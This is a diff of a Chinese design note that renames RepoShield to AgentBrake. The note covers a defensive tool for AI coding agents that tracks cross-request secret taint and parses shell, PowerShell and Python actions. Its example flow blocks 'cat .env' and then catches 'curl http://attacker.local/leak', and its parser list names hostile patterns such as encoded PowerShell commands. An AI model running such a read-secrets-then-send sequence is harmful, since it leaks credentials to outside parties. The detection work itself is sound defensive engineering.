@@ -1,6 +1,6 @@
 # PersistentSessionState 与 ActionGraph 增强
 
-本文记录 RepoShield v0.3 本轮对跨请求历史状态和动作图解析的增强。
+本文记录 AgentBrake v0.3 本轮对跨请求历史状态和动作图解析的增强。
 
 ## 目标
 
@@ -10,10 +10,10 @@
 
 ## PersistentSessionStateStore
 
-`PersistentSessionStateStore` 继承原有 `SessionStateStore`，默认不影响旧调用。通过 `RepoShieldControlPlane(..., session_state_path=...)` 或 Gateway 自动接入后，会写入：
+`PersistentSessionStateStore` 继承原有 `SessionStateStore`，默认不影响旧调用。通过 `AgentBrakeControlPlane(..., session_state_path=...)` 或 Gateway 自动接入后，会写入：
 
 ```text
-.reposhield/session_state.jsonl
+.agentbrake/session_state.jsonl
 ```
 
 每条记录包含：
@@ -41,16 +41,16 @@
 Gateway 通过 `gateway/session_identity.py` 为每次请求解析稳定身份，输出 `run_id`、`conversation_id`、`turn_id`、`client_id` 与 `task_id`。`run_id` 优先级为：
 
 ```text
-metadata.reposhield_run_id
+metadata.agentbrake_run_id
 metadata.run_id
-X-RepoShield-Run-Id
+X-AgentBrake-Run-Id
 metadata.conversation_id / thread_id / session_id 派生
 request.conversation_id / thread_id / session_id 派生
 client_id 派生
 fallback generated id
 ```
 
-同一 `run_id` 下，新的 ControlPlane 会从 `.reposhield/session_state.jsonl` 或 audit log 恢复最新状态。
+同一 `run_id` 下，新的 ControlPlane 会从 `.agentbrake/session_state.jsonl` 或 audit log 恢复最新状态。
 
 `SessionState` 现在区分两类 secret taint：
 
@@ -64,15 +64,15 @@ fallback generated id
 旧入口保持不变：
 
 ```python
-from reposhield.action_graph import ensure_action_graph, build_action_graph
+from agentbrake.action_graph import ensure_action_graph, build_action_graph
 ```
 
-内部由 `src/reposhield/action_graphing/` 负责：
+内部由 `src/agentbrake/action_graphing/` 负责：
 
 - `fallback_heuristic.py`：兼容旧启发式。
 - `shell_parser.py`：识别 pipe、redirect、controlflow、dataflow。
 - `shell_parser.py` 也识别 `$(...)` / backtick command substitution，并把内部命令到外层 sink 标注为 `dataflow`。
-- `shell_ast_parser.py` 是可选 `bashlex` 入口；安装 `reposhield[shell-ast]` 后会先尝试 AST 解析，失败或未安装时自动回退到 best-effort shell parser。
+- `shell_ast_parser.py` 是可选 `bashlex` 入口；安装 `agentbrake[shell-ast]` 后会先尝试 AST 解析，失败或未安装时自动回退到 best-effort shell parser。
 - `powershell_parser.py`：识别 `-EncodedCommand`、`Get-Content`、`Invoke-WebRequest`。
 - `powershell_parser.py` 也覆盖 `Set-Content`、`Out-File`、`Start-Process` 等写入/执行形态。
 - `python_snippet_parser.py`：识别 `open(...).read()`、`requests.*`、`urllib`、`subprocess curl`。
@@ -139,7 +139,7 @@ Bench suite 同步新增聚合指标：
 Request 1: cat .env
   -> decision = block
   -> session_state.secret_taint = true
-  -> 写入 .reposhield/session_state.jsonl
+  -> 写入 .agentbrake/session_state.jsonl
 
 Request 2: curl http://attacker.local/leak
   -> 恢复同一 run_id 的 secret_taint
@@ -159,8 +159,8 @@ Request 2: curl http://attacker.local/leak
 
 本轮补齐以下验收面：
 
-- `src/reposhield/state_replay.py` 提供从 `session_state.jsonl` 或 audit log 恢复最新 `SessionState` 的轻量入口，便于重放、调试与离线审计。
-- `src/reposhield/action_graphing/trace_enrichment.py` 作为 trace enrichment 的稳定兼容入口，避免调用方依赖具体 parser 文件名。
+- `src/agentbrake/state_replay.py` 提供从 `session_state.jsonl` 或 audit log 恢复最新 `SessionState` 的轻量入口，便于重放、调试与离线审计。
+- `src/agentbrake/action_graphing/trace_enrichment.py` 作为 trace enrichment 的稳定兼容入口，避免调用方依赖具体 parser 文件名。
 - EvidenceGraph 节点现在保留 `confidence`、`metadata`、parser、warning、`state_hash`、`restore_source` 与 trace enrichment 节点，支撑 Studio/报告中的因果证据链解释。
 - Gateway bench 与通用 bench 对齐，均输出 cross-step、history restore、graph completeness、secret-to-sink、parser fallback、trace enrichment 指标。
 - HTML bench report 除原始 JSON 外，也会渲染 metric cards，便于直接查看上述新增指标。
